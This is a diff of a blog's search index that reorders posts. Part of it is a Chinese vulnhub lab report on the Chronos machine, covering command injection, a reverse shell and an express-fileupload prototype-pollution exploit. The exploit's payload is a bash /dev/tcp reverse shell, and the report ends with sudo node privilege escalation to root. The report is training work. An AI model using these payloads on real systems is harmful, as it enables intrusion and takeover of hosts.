@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>【数据库】数据库系统概念 关系语言</title>
+    <url>/database-note2/</url>
+    <content><![CDATA[<h2 id="第-2-章-关系模型介绍"><a href="#第-2-章-关系模型介绍" class="headerlink" title="第 2 章 关系模型介绍"></a>第 2 章 关系模型介绍</h2><p>待续</p>
+]]></content>
+      <categories>
+        <category>数据库系统概念</category>
+      </categories>
+      <tags>
+        <tag>数据库</tag>
+        <tag>database</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【数据库】数据库系统概念 引言</title>
     <url>/database-note1/</url>
     <content><![CDATA[<h2 id="第-1-章-引言"><a href="#第-1-章-引言" class="headerlink" title="第 1 章 引言"></a>第 1 章 引言</h2><p>数据库管理系统（DBMS）：由一个互相关联的数据的集合和一组用以访问这些数据的程序组成。DBMS 的主要目标是要提供一种可以方便、高效地存取数据库信息的途径。</p>
@@ -178,19 +191,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【数据库】数据库系统概念 关系语言</title>
-    <url>/database-note2/</url>
-    <content><![CDATA[<h2 id="第-2-章-关系模型介绍"><a href="#第-2-章-关系模型介绍" class="headerlink" title="第 2 章 关系模型介绍"></a>第 2 章 关系模型介绍</h2><p>待续</p>
-]]></content>
-      <categories>
-        <category>数据库系统概念</category>
-      </categories>
-      <tags>
-        <tag>数据库</tag>
-        <tag>database</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Spring Boot 集成 Flowable 并自定义数据源</title>
     <url>/flowable-datasource/</url>
     <content><![CDATA[<h1 id="Spring-Boot-集成-Flowable-并自定义数据源"><a href="#Spring-Boot-集成-Flowable-并自定义数据源" class="headerlink" title="Spring Boot 集成 Flowable 并自定义数据源"></a>Spring Boot 集成 Flowable 并自定义数据源</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在使用 <code>flowable-spring-boot-starter</code> 进行 spring boot 集成 flowable 时，flowable 会使用配置文件中  <code>spring.datasource</code> 前缀下设置的数据源：</p>
@@ -236,7 +236,7 @@
     <content><![CDATA[<blockquote>
 <p>iOS assignment 1: Calculator App.</p>
 <p>姓名：可弟WZ Kekwy</p>
-<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#x6b;&#107;&#101;&#119;&#121;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#109;">&#x6b;&#x65;&#101;&#x6b;&#107;&#101;&#119;&#121;&#64;&#x71;&#113;&#x2e;&#x63;&#111;&#109;</a></p>
+<p>邮箱：<a href="mailto:&#x6b;&#101;&#x65;&#107;&#107;&#x65;&#119;&#x79;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;">&#x6b;&#101;&#x65;&#107;&#107;&#x65;&#119;&#x79;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;</a></p>
 </blockquote>
 <p>用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。</p>
 <p><strong>项目仓库：</strong><a href="https://github.com/Kekwy/iwork1-Calculator">https://github.com/Kekwy/iwork1-Calculator</a></p>
@@ -543,7 +543,7 @@
     <title>【iOS开发】IW2 新闻APP</title>
     <url>/iw2-newsapp/</url>
     <content><![CDATA[<blockquote>
-<p><a href="mailto:&#107;&#x65;&#101;&#x6b;&#107;&#x65;&#x77;&#x79;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;">&#107;&#x65;&#101;&#x6b;&#107;&#x65;&#x77;&#x79;&#64;&#113;&#113;&#46;&#99;&#111;&#x6d;</a></p>
+<p><a href="mailto:&#x6b;&#x65;&#101;&#107;&#107;&#101;&#119;&#121;&#x40;&#113;&#113;&#46;&#x63;&#111;&#109;">&#x6b;&#x65;&#101;&#107;&#107;&#101;&#119;&#121;&#x40;&#113;&#113;&#46;&#x63;&#111;&#109;</a></p>
 </blockquote>
 <ul>
 <li><a href="#%E7%AE%80%E4%BB%8B">简介</a><ul>
@@ -884,6 +884,218 @@
       </tags>
   </entry>
   <entry>
+    <title>【渗透测试】第五周 vulnhub-</title>
+    <url>/lab5-report/</url>
+    <content><![CDATA[<h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote>
+<p>网络攻防实战 第七次实验</p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#107;&#107;&#101;&#x77;&#x79;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#107;&#101;&#101;&#107;&#107;&#101;&#x77;&#x79;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+<p>2022年10月19日</p>
+<p>靶机链接：</p>
+</blockquote>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机中的flag，并取得目标靶机的root权限。</p>
+<p>我们将使用到以下攻击手段：</p>
+<ul>
+<li>主机发现、端口扫描</li>
+<li>查看 web 源码</li>
+<li>编&#x2F;解码</li>
+<li>注入命令</li>
+<li>反弹 shell</li>
+<li>代码审计</li>
+<li>搜索漏洞信息</li>
+<li>利用 <code>express-fileupload</code> 的代码漏洞</li>
+<li>本地提权</li>
+</ul>
+<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
+<p>kali: 10.0.2.15</p>
+<p>靶机: 10.0.2.9</p>
+</blockquote>
+<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
+<li><p>发现靶机IP并对其进行端口扫描，查看各端口所运行的服务类型：</p>
+<div align=left>
+    <img src="https://assets.kekwy.com/images/image-20221020092811961.png" width=750 />
+</div>
+
+
+<p>发现目标靶机的80端口和8000端口上都运行了一个web应用。</p>
+</li>
+<li><p>首先通过浏览器访问靶机80端口上的 web 应用：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221020093445922.png" width=700 />
+</div>
+
+<p>出现 “Data &amp; Time” 字样，无明显线索。查看源码，发现一段 JavaScript 代码：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221020094049616.png" width=700 />
+</div>
+
+
+<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 的 <code>beautify</code> 功能进行美化：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf = [</span><br><span class="line">	<span class="string">&#x27;150447srWefj&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;70lwLrol&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1658165LmcNig&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1260881JUqdKM&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;10737CrnEEe&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2SjTdWC&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;readyState&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;responseText&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1278676qXleJg&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;797116soVTES&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;onreadystatechange&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1DYOODT&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;400909Mbbcfr&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Chronos&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2QRBPWS&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;getElementById&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;innerHTML&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;date&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>发现其中包含对 <code>chronos.local</code> 的访问，尝试在 kali 上将其与靶机的IP地址绑定。</p>
+</li>
+<li><p>修改 <code>/etc/hosts</code> ，加入如下内容：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221020095325946.png" width=500 />
+</div>
+
+
+<p>再次访问靶机 80 端口，发现出现了日期时间等字样：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021135006594.png" width=700 />
+</div></li>
+</ol>
+<h3 id="0x01-指令注入漏洞"><a href="#0x01-指令注入漏洞" class="headerlink" title="0x01. 指令注入漏洞"></a>0x01. 指令注入漏洞</h3><ol>
+<li><p>再次查看网页源码发现一段疑似 base58 编码的字符串：</p>
+<p><code>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</code></p>
+<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 解码：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021135323274.png" width=750 />
+</div>
+
+
+<p>得到 <code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>，推测此处存在指令注入漏洞。</p>
+</li>
+<li><p>再次访问靶机 80 端口，并通过 <code>Burp Suite</code> 拦截对访问 8000 端口时的数据包，并将其发送至 <code>Repeater</code>：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021135647863.png" width=600 />
+</div>
+
+
+<p>尝试将我们想要执行的指令，通过 <code>&amp;&amp; [$cmd]</code> 的形式添加在 <code>format=</code> 之后（[$cmd] 是目标指令内容）。但是需要注意的是，我们的注入内容同样需要经过 base58 编码。</p>
+<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 对我们欲注入的内容进行编码，首先尝试执行 ls 指令：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140051546.png" width=700 />
+</div>
+</li>
+<li><p>在 Repeater 中修改数据包：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140158305.png" width=400 />
+</div>
+
+
+<p>点击发送，查看返回结果，发现返回了某路径下的内容，确认其存在指令注入漏洞：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140345158.png" width=400 />
+</div>
+</li>
+<li><p>接下来我们将尝试以此作为突破口生成反弹 shell。</p>
+</li>
+</ol>
+<h3 id="0x02-生成反弹-shell"><a href="#0x02-生成反弹-shell" class="headerlink" title="0x02. 生成反弹 shell"></a>0x02. 生成反弹 shell</h3><ol>
+<li><p>利用上述指令出入漏洞查看靶机 <code>/usr/bin</code> 下的文件，注入步骤同上：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021140646383.png" width=350 />
+</div>
+
+
+<p>发现存在 python 环境，故尝试利用此前多次使用的 python 反弹 shell 代码生成反弹 shell。</p>
+</li>
+<li><p>在 kali 监听 4444 端口，将反弹 shell 命令编码后注入：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021141046767.png" width=550 />
+</div>
+
+
+<p>成功获取到来自靶机的反弹 shell。</p>
+</li>
+<li><p>通过一下命令进行提升：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021141422079.png" width=550 />
+</div></li>
+</ol>
+<h3 id="0x03-node-js-express-fileupload-漏洞"><a href="#0x03-node-js-express-fileupload-漏洞" class="headerlink" title="0x03. node.js express-fileupload 漏洞"></a>0x03. node.js express-fileupload 漏洞</h3><ol>
+<li><p>通过简单的信息收集，我们在 <code>/opt/chronos-v2/backend</code> 路径下找到了与 <code>node.js</code> 服务相关的文件 <code>server.js</code>：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021142250813.png" width=550 />
+</div>
+
+
+<p>查看其内容：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>发现该代码在运行时会在本地 IP 的 8080 端口上运行一个 web 服务器。同时还发现该应用加载了 <code>express-fileupload</code> 库。通过搜索，发现若设置了 <code>app.use(fileupload(&#123; parseNested: true &#125;));</code> ，则存在可以用的漏洞。再次查看上述代码，发现恰好启用了该服务。</p>
+</li>
+<li><p>继续搜索有关内容，最终在一篇<a href="https://blog.p6.is/Real-World-JS-1/">博客文章</a>中找到可用的漏洞利用代码，并根据实验环境进行修改：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.0.2.15 为靶机的IP</span></span><br><span class="line"><span class="comment"># 5555 为靶机监听的端口</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.0.2.15/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8080 为本次实验中目标服务的访问地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先将该段代码写入位于 kali 的某一文件中，再通过之前实验中的方式，利用在 kali 上启动 web 服务的方式将该文件上传至靶机（通过之前的步骤我们得知靶机中存在 python 环境）</p>
+<p><a id="要链接！！！"></a></p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021144921540.png" width=350 />
+</div>
+</li>
+<li><p>执行：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 code.py</span><br></pre></td></tr></table></figure>
+
+<p>获取到另一个用户身份的反弹shell：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/@IFF6W$S]HAT[XN09[_}XU.png" width=700 />
+</div></li>
+</ol>
+<h3 id="0x04-第一个-Flag"><a href="#0x04-第一个-Flag" class="headerlink" title="0x04. 第一个 Flag"></a>0x04. 第一个 Flag</h3><ol>
+<li><p>切换至当前用户的主目录 <code>/home/imera</code>，发现文件 <code>user.txt</code>。查看内容：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151014936.png" width=400 />
+</div>
+</li>
+<li><p>使用 base58 解码后，得到：</p>
+<p><code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
+</li>
+</ol>
+<h3 id="0x05-利用-node-命令提权"><a href="#0x05-利用-node-命令提权" class="headerlink" title="0x05. 利用 node 命令提权"></a>0x05. 利用 node 命令提权</h3><ol>
+<li><p>查看当前用户可以通过 <code>sudo</code> 执行的命令：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151621621.png" width=700 />
+</div>
+
+
+<p>发现存在两个命令可以不提供密码直接使用 <code>sudo</code> 执行。</p>
+</li>
+<li><p>输入以下命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo node -e <span class="string">&#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成一个拥有 root 权限的 shell 进行提权：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
+</div></li>
+</ol>
+<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><p>Flag1：<code>Char &#39;I&#39; at position 12 not in alphabet</code></p>
+<p>root 提权：</p>
+<div align=left>
+ <img src="https://assets.kekwy.com/images/image-20221021151917440.png" width=700 />
+</div>
+
+
+
+
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
+<li>访问靶机80端口，查看源码发现存在对域名地址 <code>chronos.local</code> 的访问；</li>
+<li>修改 kali 的 <code>/etc/hosts</code> 文件，将上述域名与靶机 IP 绑定；</li>
+<li>利用  <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行数据的编解码；</li>
+<li>拦截访问靶机80端口时，向 <code>http://chronos.local:8000</code> 发送的数据包，利用命令注入漏洞注入编码后的反弹 shell 指令；</li>
+<li>利用反弹 shell 进行信息收集，对文件  <code>/opt/chronos-v2/backend/server.js</code> 进行代码审计，发现隐藏的本地服务器；</li>
+<li>上网搜索相关的漏洞信息，发现漏洞利用代码；</li>
+<li>将代码文件上传至靶机并执行，得到另一个用户身份的反弹 shell；</li>
+<li>利用 node 命令进行本地提权。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络攻防实战</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>Kali</tag>
+        <tag>网络</tag>
+        <tag>安全</tag>
+        <tag>Linux</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>集合类与I/O操作</title>
     <url>/javaNotes-3/</url>
     <content><![CDATA[<p>数组的长度是固定的，集合的长度是可变的。</p>
@@ -1114,231 +1326,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【渗透测试】第五周 vulnhub-</title>
-    <url>/lab5-report/</url>
-    <content><![CDATA[<h1 id="网络攻防实战-实验报告"><a href="#网络攻防实战-实验报告" class="headerlink" title="网络攻防实战 实验报告"></a>网络攻防实战 实验报告</h1><blockquote>
-<p>网络攻防实战 第七次实验</p>
-<p>邮箱：<a href="mailto:&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;">&#107;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#109;</a></p>
-<p>2022年10月19日</p>
-<p>靶机链接：</p>
-</blockquote>
-<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
-<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>获取靶机中的flag，并取得目标靶机的root权限。</p>
-<p>我们将使用到以下攻击手段：</p>
-<ul>
-<li>主机发现、端口扫描</li>
-<li>查看 web 源码</li>
-<li>编&#x2F;解码</li>
-<li>注入命令</li>
-<li>反弹 shell</li>
-<li>代码审计</li>
-<li>搜索漏洞信息</li>
-<li>利用 <code>express-fileupload</code> 的代码漏洞</li>
-<li>本地提权</li>
-</ul>
-<h2 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容"></a>二、实验内容</h2><blockquote>
-<p>kali: 10.0.2.15</p>
-<p>靶机: 10.0.2.9</p>
-</blockquote>
-<h3 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00. 准备工作"></a>0x00. 准备工作</h3><ol>
-<li><p>发现靶机IP并对其进行端口扫描，查看各端口所运行的服务类型：</p>
-<div align=left>
-    <img src="https://assets.kekwy.com/images/image-20221020092811961.png" width=750 />
-</div>
-
-
-<p>发现目标靶机的80端口和8000端口上都运行了一个web应用。</p>
-</li>
-<li><p>首先通过浏览器访问靶机80端口上的 web 应用：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221020093445922.png" width=700 />
-</div>
-
-<p>出现 “Data &amp; Time” 字样，无明显线索。查看源码，发现一段 JavaScript 代码：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221020094049616.png" width=700 />
-</div>
-
-
-<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 的 <code>beautify</code> 功能进行美化：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5bdf = [</span><br><span class="line">	<span class="string">&#x27;150447srWefj&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;70lwLrol&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1658165LmcNig&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1260881JUqdKM&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;10737CrnEEe&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2SjTdWC&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;readyState&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;responseText&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1278676qXleJg&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;797116soVTES&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;onreadystatechange&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;User-Agent&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;status&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;1DYOODT&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;400909Mbbcfr&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;Chronos&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;2QRBPWS&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;getElementById&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;innerHTML&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;date&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-<p>发现其中包含对 <code>chronos.local</code> 的访问，尝试在 kali 上将其与靶机的IP地址绑定。</p>
-</li>
-<li><p>修改 <code>/etc/hosts</code> ，加入如下内容：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221020095325946.png" width=500 />
-</div>
-
-
-<p>再次访问靶机 80 端口，发现出现了日期时间等字样：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021135006594.png" width=700 />
-</div></li>
-</ol>
-<h3 id="0x01-指令注入漏洞"><a href="#0x01-指令注入漏洞" class="headerlink" title="0x01. 指令注入漏洞"></a>0x01. 指令注入漏洞</h3><ol>
-<li><p>再次查看网页源码发现一段疑似 base58 编码的字符串：</p>
-<p><code>http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</code></p>
-<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 解码：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021135323274.png" width=750 />
-</div>
-
-
-<p>得到 <code>&#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;</code>，推测此处存在指令注入漏洞。</p>
-</li>
-<li><p>再次访问靶机 80 端口，并通过 <code>Burp Suite</code> 拦截对访问 8000 端口时的数据包，并将其发送至 <code>Repeater</code>：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021135647863.png" width=600 />
-</div>
-
-
-<p>尝试将我们想要执行的指令，通过 <code>&amp;&amp; [$cmd]</code> 的形式添加在 <code>format=</code> 之后（[$cmd] 是目标指令内容）。但是需要注意的是，我们的注入内容同样需要经过 base58 编码。</p>
-<p>使用 <a href="https://gchq.github.io/CyberChef/">CyberChef</a> 对我们欲注入的内容进行编码，首先尝试执行 ls 指令：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140051546.png" width=700 />
-</div>
-</li>
-<li><p>在 Repeater 中修改数据包：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140158305.png" width=400 />
-</div>
-
-
-<p>点击发送，查看返回结果，发现返回了某路径下的内容，确认其存在指令注入漏洞：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140345158.png" width=400 />
-</div>
-</li>
-<li><p>接下来我们将尝试以此作为突破口生成反弹 shell。</p>
-</li>
-</ol>
-<h3 id="0x02-生成反弹-shell"><a href="#0x02-生成反弹-shell" class="headerlink" title="0x02. 生成反弹 shell"></a>0x02. 生成反弹 shell</h3><ol>
-<li><p>利用上述指令出入漏洞查看靶机 <code>/usr/bin</code> 下的文件，注入步骤同上：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021140646383.png" width=350 />
-</div>
-
-
-<p>发现存在 python 环境，故尝试利用此前多次使用的 python 反弹 shell 代码生成反弹 shell。</p>
-</li>
-<li><p>在 kali 监听 4444 端口，将反弹 shell 命令编码后注入：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021141046767.png" width=550 />
-</div>
-
-
-<p>成功获取到来自靶机的反弹 shell。</p>
-</li>
-<li><p>通过一下命令进行提升：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
-
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021141422079.png" width=550 />
-</div></li>
-</ol>
-<h3 id="0x03-node-js-express-fileupload-漏洞"><a href="#0x03-node-js-express-fileupload-漏洞" class="headerlink" title="0x03. node.js express-fileupload 漏洞"></a>0x03. node.js express-fileupload 漏洞</h3><ol>
-<li><p>通过简单的信息收集，我们在 <code>/opt/chronos-v2/backend</code> 路径下找到了与 <code>node.js</code> 服务相关的文件 <code>server.js</code>：</p>
-<div align=left>
- <img src="https://assets.kekwy.com/images/image-20221021142250813.png" width=550 />
-</div>
-
-
-<p>查看其内容：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&quot;express-fileupload&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileupload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&quot;/opt/chronos-v2/frontend/pages&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title class_">Server</span>(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server listening on &#x27;</span> 